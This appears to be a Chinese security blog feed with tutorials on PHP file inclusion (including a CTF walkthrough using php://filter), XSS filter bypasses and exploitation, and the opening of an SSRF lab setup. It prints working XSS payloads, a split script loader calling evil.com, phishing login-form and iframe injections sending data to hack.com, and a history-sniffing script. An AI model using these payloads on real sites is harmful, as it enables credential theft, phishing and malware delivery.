title="3、配合文件上传漏洞"></a>3、配合文件上传漏洞</h4><p>如果上传的木马文件所在的路径不可以通过外网访问，但是可以通过文件包含漏洞读取，那么就可以构造参数将该文件运行，就可以得到webshell。</p><h4 id="4、使用PHP封装协议读取文件和写入PHP文件"><a href="#4、使用PHP封装协议读取文件和写入PHP文件" class="headerlink" title="4、使用PHP封装协议读取文件和写入PHP文件"></a>4、使用PHP封装协议读取文件和写入PHP文件</h4><p>读取文件，可以通过输入page参数值如下：php://filter/read=convert.base64-encode/resource=../../../../../var/www/html/upload/xxx.txt来读取并执行。</p><p>写入文件，可以通过传入page=php://input，然后post提交我们要输入的内容。</p><h2 id="0x06-一个ctf例子"><a href="#0x06-一个ctf例子" class="headerlink" title="0x06 一个ctf例子"></a>0x06 一个ctf例子</h2><p>我们可以用一个ctf的例子来看看实际中怎么利用。</p><p>是iscc的一道web题</p><p>目标网址是一张图片 <a href="http://118.190.152.202:8006/">http://118.190.152.202:8006/</a></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include08.png"></p><p>源码中只有</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;show.php?img=1.jpg&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>然后我们点开 <a href="http://118.190.152.202:8006/show.php?img=1.jpg">http://118.190.152.202:8006/show.php?img=1.jpg</a></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include09.png"></p><p>看到这个img参数，很容易想到文件包含漏洞</p><p>然后访问 <a href="http://118.190.152.202:8006/show.php?img=file:///show.php">http://118.190.152.202:8006/show.php?img=file:///show.php</a> 尝试访问本页面源码<br>发现file not find</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include10.png"></p><p>但是我们知道php://filter可以指定两个resource，这个时候构造<br><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php</a></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include11.png"></p><p>然后查看源代码就可以看本页面代码了，接下来根据源码读取flag.php，查看源码，就完成了 <a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php</a></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/file_include/include12.png"></p><h2 id="0x07-应对"><a href="#0x07-应对" class="headerlink" title="0x07 应对"></a>0x07 应对</h2><ul><li><p>1.判断包含中的参数是否外部可控。</p></li><li><p>2.限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。</p></li><li><p>3.验证被包含的文件是否在白名单中。</p></li><li><p>4.尽量不要使用变量，如要使用包含，直接规定好包含的文件名，如：“include(“head.php”)”。</p></li><li><p>5.可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。</p></li><li><p>6.如非必要，不要打开远程文件包含。 </p></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>php</tag>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS绕过和利用方式总结</title>
    <link href="/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-XSS"><a href="#0x00-XSS" class="headerlink" title="0x00 XSS"></a>0x00 XSS</h2><p>XSS，跨站脚本攻击(Cross Site Scripting)，恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。比如获取用户Cookie，会话劫持，钓鱼欺骗等多种攻击。</p><h2 id="0x01-绕过"><a href="#0x01-绕过" class="headerlink" title="0x01 绕过"></a>0x01 绕过</h2><p>实际的情况中，很多网站会对&lt;&gt;，script等关键词进行限制，也有的不允许在input中运行js脚本，这个时候，就需要去考虑怎么绕过。</p><ul><li>1 大小写混用</li></ul><p>首先是最简单的大小写混用，对一些仅仅匹配过滤的系统进行绕过，如：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ScRipt</span>&gt;</span><span class="javascript">AleRt(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRipt</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>2 利用HTML标签属性值执行</li></ul><p>在某些系统中，用户不能自己构造html标签，这个时候可以使用html标签属性值调用js，比如:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;table <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;jacascript:alert(/xss/)&quot;</span>&gt;&lt;/table&gt;<br>&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><ul><li>3 回车空格等</li></ul><p>在有些系统中，xss Filter仅仅将敏感字符列入黑名单，可以通过空格，tab，回车来绕过限制，如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javas cript:alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>或者换行输入用分号分隔：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&lt;img src=<span class="hljs-string">&quot;javas</span><br>cript:<br>alert(&#x27;xss&#x27;);<span class="hljs-string">&quot;&gt;</span><br></code></pre></td></tr></table></figure><ul><li>4 对标签属性进行转码</li></ul><p>普通的标签属性值过滤还可以通过编码绕过，如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>可以写成：</p><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cal">&lt;img src=&amp;<span class="hljs-string">#106</span>;&amp;<span class="hljs-string">#97</span>;&amp;<span class="hljs-string">#118</span>;&amp;<span class="hljs-string">#97</span>;&amp;<span class="hljs-string">#115</span>;&amp;<span class="hljs-string">#99</span>;&amp;<span class="hljs-string">#114</span>;&amp;<span class="hljs-string">#105</span>;&amp;<span class="hljs-string">#112</span>;&amp;<span class="hljs-string">#116</span>;&amp;<span class="hljs-string">#58</span>;&amp;<span class="hljs-string">#97</span>;&amp;<span class="hljs-string">#108</span>;&amp;<span class="hljs-string">#101</span>;&amp;<span class="hljs-string">#114</span>;&amp;<span class="hljs-string">#116</span>;&amp;<span class="hljs-string">#40</span>;&amp;<span class="hljs-string">#39</span>;&amp;<span class="hljs-string">#120</span>;&amp;<span class="hljs-string">#115</span>;&amp;<span class="hljs-string">#115</span>;&amp;<span class="hljs-string">#39</span>;&amp;<span class="hljs-string">#41</span>;&gt;<br></code></pre></td></tr></table></figure><ul><li>5 自己构造事件</li></ul><p>不能依靠属性值运行xss的时候，我们可以尝试通过html事件来实现xss，如：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-attribute">onerror</span>=alert(&#x27;xss&#x27;) &gt;<br></code></pre></td></tr></table></figure><p>图片地址不存在，加载失败的时候就会运行后面的脚本</p><p>也可以在别的位置使用：<br>onload加载完成时运行<br>oncheck点击时运行<br>onmousemove当鼠标移动时运行</p><ul><li>6 注释过滤</li></ul><p>在样式表中，/**/中间的内容会被浏览器忽略，在css中，我们可以使用expression执行js代码，这个时候遇到黑名单过滤，我们就可以通过添加无意义的注释符号来避开过滤。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;xss:expr/*xss*/ession(alert(&#x27;xss&#x27;))&quot;</span>&gt;<br></code></pre></td></tr></table></figure><ul><li>7 拆分跨站</li></ul><p>有的网站输入框对输入长度有所限制，无法构造出完整的xss代码，这个时候有一种十分巧妙的拆分法可供选择，如我们要输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">document.write(&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.evil.com/hack.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&#x27;)<br></code></pre></td></tr></table></figure><p>但是输入框限制每次只能输入30个字符时，我们可以：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=<span class="hljs-string">&#x27;document.&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;write(&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;&lt;script&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;src=htt&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;p://www&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;.evil.c&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;om/hack&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;.js&gt;&lt;/s&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;cript&gt;&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;)&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">z=z+<span class="hljs-string">&#x27;eval(z)&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样就成功将代码拼接在z中，再通过eval(z)执行代码。</p><h2 id="0x03-cookie劫持"><a href="#0x03-cookie劫持" class="headerlink" title="0x03 cookie劫持"></a>0x03 cookie劫持</h2><p>cookie劫持在上一篇的跨站脚本攻击中已经详细演示过，具体方法就是通过用户点击链接访问页面，执行恶意xss代码然后将用户的浏览器cookie发送到我们自己的远程服务器，然后通过cookie来登陆。</p><h2 id="0x04-xss钓鱼"><a href="#0x04-xss钓鱼" class="headerlink" title="0x04 xss钓鱼"></a>0x04 xss钓鱼</h2><p>xss钓鱼是xss最常用的利用方式，有很多种实现方式：</p><ul><li>xss重定向钓鱼</li></ul><p>我们在一个网页找到了xss漏洞：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.123.com/index.php?input=</span>[<span class="hljs-string">Expliot</span>]<br></code></pre></td></tr></table></figure><p>构造如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.123.com/index.php?input=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location.href=<span class="hljs-string">&quot;http://www.hack.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>就可以通过xss重定向，将网页跳转到<a href="http://www.hack.com/">www.hack.com</a></p><ul><li>HTML注入式钓鱼</li></ul><p>仍然假设有如下漏洞页面</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.123.com/index.php?input=</span>[<span class="hljs-string">Expliot</span>]<br></code></pre></td></tr></table></figure><p>然后我们在input里面写入一段html代码，就会在正常的网页中增添一个我们构造的登陆表单：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://www.hack.com/index.php?input=&quot;&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: center;&quot;</span>&gt;</span>&lt;form<br>Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>Login:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;login&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>Password:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Valid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Ok&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后通过这个表单覆盖网页中的部分位置，就很容易引诱用户输入账号密码。</p><ul><li>iframe钓鱼</li></ul><p>iframe是HTML标签，作用是文档中的文档，或者浮动的框架(FRAME)。iframe元素会创建包含另外一个文档的内联框架。<br>我们先来看一个iframe的例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span>&#123;</span><br><span class="css">      <span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">  <span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br><span class="css">  <span class="hljs-attribute">padding</span>:<span class="hljs-number">0px</span>;</span><br>  &#125;<br><span class="css"><span class="hljs-selector-tag">iframe</span>&#123;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;iframepage&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;iframepage&quot;</span>  <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100%&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这样我们可以用百度页面覆盖整个网页。</p><p>而xss-iframe钓鱼就是攻击者在有xss的网站中用iframe框架调用自己的黑页，覆盖整个页面或者登陆框，将数据传给自己。<br>我们可以先在自己的<a href="http://www.hack.com搭建好完全和对方相同的网页,并且在后台写好接收保存账号密码的php文件,然后将style和iframe写在xss中/">www.hack.com搭建好完全和对方相同的网页，并且在后台写好接收保存账号密码的php文件，然后将style和iframe写在xss中</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;style&gt;body&#123;<span class="hljs-attribute">margin</span>:<span class="hljs-number">0px</span>;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;<span class="hljs-attribute">padding</span>:<span class="hljs-number">0px</span>;&#125;<br>iframe&#123;<span class="hljs-attribute">border</span>:<span class="hljs-number">0px</span>;&#125;<br>&lt;<span class="hljs-selector-tag">iframe</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;http://www.hack.com/&quot;</span>width=<span class="hljs-string">&quot;100%&quot;</span> height=<span class="hljs-string">&quot;100%&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></td></tr></table></figure><p>就会覆盖整个网页，并且将数据传给我们的网站。而且用户访问这个网站时url仍然是原本的url。</p><h2 id="0x05-http-history-hack"><a href="#0x05-http-history-hack" class="headerlink" title="0x05 http history hack"></a>0x05 http history hack</h2><p>css中有个属性visited，可以设置访问过的链接样式，然后xss可以通过遍历检查css中的visited属性，来查看一个用户是否访问过某些网站。</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs qml">&lt; script &gt;<br><span class="hljs-keyword">var</span> websites = [要检测的访问过的网址列表（自己补充）];<br><span class="hljs-comment">//遍历每个URL</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-attribute">websites.length</span>: i++) &#123;<br>    <span class="hljs-keyword">var</span> link = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;a&quot;</span>);<br>    link.id = <span class="hljs-string">&quot;id&quot;</span> + i;<br>    link.href = websites[i];<br>    link.innerHTML = websites[i];<br>    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;style&gt;&#x27;</span>);<br>    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;#id&#x27;</span> + i + <span class="hljs-string">&quot;:visited &#123;color:#FF0000;&#125;&quot;</span>);<br>    <span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;/style&gt;&#x27;</span>);<br>    <span class="hljs-built_in">document</span>.body.appendChild(link);<br>    <span class="hljs-keyword">var</span> <span class="hljs-built_in">color</span> = <span class="hljs-built_in">document</span>.defaultView.getComputedStyle(link, <span class="hljs-literal">null</span>).getPropertyValue(<span class="hljs-string">&quot;color&quot;</span>);<br>    <span class="hljs-built_in">document</span>.body.removeChild(link);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">color</span> == <span class="hljs-string">&quot;rgb(255,0,0)&quot;</span>) &#123; <span class="hljs-comment">//visited</span><br>        <span class="hljs-keyword">var</span> item = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;li&#x27;</span>);<br>        item.appendChild(link);<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;visited&#x27;</span>).appendChild(item);<br>    &#125; <span class="hljs-title">else</span> &#123; <span class="hljs-comment">//Not visited</span><br>        <span class="hljs-keyword">var</span> item = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;li&#x27;</span>);<br>        item.appendChild(link);<br>        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;notvisited&#x27;</span>).appendChild(item);<br>    &#125;<br>&#125; &lt; <span class="hljs-regexp">/script&gt;/</span><br></code></pre></td></tr></table></figure><h2 id="0x06-xss网页挂马"><a href="#0x06-xss网页挂马" class="headerlink" title="0x06 xss网页挂马"></a>0x06 xss网页挂马</h2><p>在存储型xss中，我们可以将自己的xss代码提交上去，然后链接我们的木马，这样每个访问有xss页面的人都会触发木马。</p><h2 id="0x07-xss-Wrom"><a href="#0x07-xss-Wrom" class="headerlink" title="0x07 xss Wrom"></a>0x07 xss Wrom</h2><p>xss wrom即xss蠕虫，在一些存在存储型xss漏洞的大型社交网站，如果我们将xss代码的功能写成让访问到的人，在自己的主页里或其他有权限的页面提交一个一样的xss代码，这样浏览他的主页的人也会受到xss wrom影响继续写xss代码，这样就会很快传遍整个网络，危害极大。<br>而且xss蠕虫通常使用了大量的Ajax技术，即异步请求，无须刷新即可传输数据，隐蔽性高，传播速度极快。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF服务端请求伪造</title>
    <link href="/2018/04/23/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <url>/2018/04/23/SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-SSRF服务端请求伪造"><a href="#0x00-SSRF服务端请求伪造" class="headerlink" title="0x00 SSRF服务端请求伪造"></a>0x00 SSRF服务端请求伪造</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。与CSRF跨站请求伪造不同,它是利用服务端向其他内外网服务器发送请求。</p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。如果应用程序对用户提供的URL和远端服务器返回的信息没有进行合适的验证和过滤，就可能存在服务端请求伪造的缺陷。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><h2 id="0x02-危害"><a href="#0x02-危害" class="headerlink" title="0x02 危害"></a>0x02 危害</h2><ul><li><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p></li><li><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p></li><li><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p></li><li><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p></li><li><p>5.利用file协议读取本地文件等。</p></li></ul><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>首先我们创建一个test.html,输入如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ssrf&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://127.0.0.1/ssrf/test.php&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:500px&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;commit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ps:这里我修改css是为了截图时候能截取的全面点，可以不加。</p><p>然后写他对应的后台文件test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.rand().<span 